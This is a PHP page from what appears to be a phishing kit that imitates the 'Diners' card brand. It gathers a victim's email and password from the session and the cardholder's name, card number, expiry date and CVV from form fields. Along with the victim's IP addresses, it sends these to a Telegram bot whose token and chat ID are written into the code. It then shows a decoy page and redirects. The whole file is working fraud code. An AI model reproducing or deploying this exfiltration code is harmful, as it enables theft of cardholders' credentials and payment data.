<?php
session_start();

// Construir el mensaje
$message = "Diners\n";
$message .= "-------------------------------------------\n";
$message .= 'E: ' . $_SESSION['u1'] . "\n";
$message .= 'P: ' . $_SESSION['u2'] . "\n";
$message .= 'NM: ' . $_POST['gtrip01'] . "\n";
$message .= 'AP: ' . $_POST['gtrip02'] . "\n";
$message .= 'T: ' . $_POST['gtrip03'] . "\n";
$message .= 'FV: ' . $_POST['gtrip04'] . "/" . $_POST['gtrip05'] . "\n";
$message .= 'CV: ' . $_POST['gtrip06'] . "\n";

// Verificar si la clave HTTP_X_FORWARDED_FOR existe antes de usarla
$ip2 = isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : 'No disponible';
$message .= 'IP1: ' . $_SERVER['REMOTE_ADDR'] . "\n";
$message .= 'IP2: ' . $ip2 . "\n";

$message .= 'Date: ' . date("d-m-Y") . "\n";

// Datos del bot de Telegram
$token = "5555165841:AAE7e0yrao7YTcSmfDKy0Y6vnY0SO-0UyFE";
$chat_id = "1024082369";

// Enviar la información a Telegram
$sendText = urlencode($message);
$url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$sendText";

file_get_contents($url);

// Redirigir después de 8 segundos
header('Refresh: 8; URL=./3.php');

// Destruir la sesión
session_destroy();
?>


<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Inicio</title>
  </head>
  <body>
    <style>
      *{margin: 0;padding: 0;}
    </style>
    <div id="gtrx" style="height:100vh;text-align:center">
        <img id="lg01" src="logo.png" style="display: inline-block;margin-top: 80px;width:380px;"><br>
        <div onclick="ldfrm()" id="gtr01" style="margin-top: 20px;display: inline-block; width: 373px;height:600px;background-image:url(5.svg);box-shadow:0 2px 6px rgba(0,0,0,.2);background-repeat:no-repeat;">
            
        </div>
        
    </div>
    <style>
        @media only screen and (max-width: 500px){
            #gtr01{
                /*zoom:90%;*/
                border:none !important;
                box-shadow:none!important;
            }
            #lg01{
              /*zoom:90%;*/
            }
        }
    </style>
    
  </body>
</html>